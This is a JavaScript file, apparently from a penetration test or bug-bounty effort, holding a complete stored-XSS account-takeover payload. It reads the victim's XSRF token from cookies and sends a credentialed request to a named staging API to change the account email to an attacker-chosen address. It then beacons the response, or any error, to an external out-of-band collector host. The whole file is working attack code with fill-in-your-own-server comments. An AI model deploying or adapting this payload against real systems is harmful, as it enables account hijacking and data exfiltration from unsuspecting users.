// a.js - Complete Stored XSS Account Takeover Payload

(function() {
    // 1. CONFIGURATION
    const TARGET_API = 'https://basilstagingapi.coraltreetech.com/api/user/update';
    const ATTACKER_SERVER = 'https://sa6gpti0t3wpbikbvuvwuxi0zr5it8hx.oastify.com/log'; // Replace with your VPS/ngrok URL

    // 2. STEAL THE CSRF TOKEN FROM COOKIES
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    const xsrfToken = getCookie('Secure-XSRF_TOKEN');

    if (!xsrfToken) {
        // If no CSRF token, send a warning back to yourself
        navigator.sendBeacon(ATTACKER_SERVER, 'XSRF Token NOT found!');
        return;
    }

    // 3. SEND THE MALICIOUS REQUEST (CHANGE EMAIL)
    fetch(TARGET_API, {
        method: 'POST',
        credentials: 'include', // CRITICAL: Sends HttpOnly session_token
        headers: {
            'Content-Type': 'application/json',
            'X-XSRF-TOKEN': xsrfToken,   // Bypass CSRF protection
            'X-Requested-With': 'XMLHttpRequest' // Sometimes required by backend
        },
        body: JSON.stringify({ 
            email: '
harshit.j+regular1@cywarden.com' // Change this to your email
        })
    })
    .then(response => {
        // 4. EXFILTRATE THE RESULT BACK TO YOU
        return response.text().then(text => {
            const data = {
                status: response.status,
                statusText: response.statusText,
                body: text,
                url: window.location.href
            };
            // Send the response to your attacker server
            navigator.sendBeacon(ATTACKER_SERVER, JSON.stringify(data));
        });
    })
    .catch(error => {
        // If the fetch fails (CORS error, network error), log it
        navigator.sendBeacon(ATTACKER_SERVER, 'Fetch Error: ' + error.message);
    });

})();
